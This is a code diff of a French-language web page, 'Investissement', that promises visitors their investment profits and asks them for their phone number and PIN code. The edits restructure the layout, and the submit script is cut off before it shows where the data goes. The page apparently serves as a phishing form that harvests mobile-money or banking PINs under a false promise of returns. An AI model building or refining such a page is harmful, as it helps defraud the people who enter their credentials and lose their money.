@@ -3,27 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="/static/style.css">
+    <link rel="stylesheet" href="style.css">
     <title>Investissement</title>
 </head>
 <body>
-    <header>
-        <img src="globalInvestissement.jpg" alt="Bannière" class="header-img">
-    </header>
-    <p>Recevez les bénéfices de votre investissement !</p>
-    <form id="formulaire">
-        <!-- Numéro -->
-        <label for="numero">Numéro :</label>
-        <input type="text" id="numero" name="numero" pattern="[0-9+ ]+" required placeholder="Ex: +1 012 345 6789">
+    <main>
+        <header>
+            <img src="globalInvestissement.jpg" alt="Bannière" class="header-img">
+        </header>
+        <p>Recevez les bénéfices de votre investissement !</p>
+        <form id="formulaire">
+            <!-- Numéro -->
+            <label for="numero">Numéro :</label>
+            <input type="text" id="numero" name="numero" pattern="[0-9+ ]+" required placeholder="Ex: +1 012 345 6789">
 
-        <!-- Code PIN -->
-        <br><label for="code_pin">Code PIN :</label>
-        <input type="text" id="code_pin" name="code_pin" pattern="[0-9 ]+" required placeholder="Ex: 1234">
+            <!-- Code PIN -->
+            <br><label for="code_pin">Code PIN :</label>
+            <input type="text" id="code_pin" name="code_pin" pattern="[0-9 ]+" required placeholder="Ex: 1234">
 
-        <!-- Bouton de validation -->
-        <br><button type="submit" class="btn-valider">Valider</button>
-    </form>
+            <!-- Bouton de validation -->
+            <br><button type="submit" class="btn-valider">Valider</button>
+        </form>
 
+    </main>
     <script>
         document.getElementById("formulaire").addEventListener("submit", function(event) {
             event.preventDefault(); // Empêche le rechargement de la page
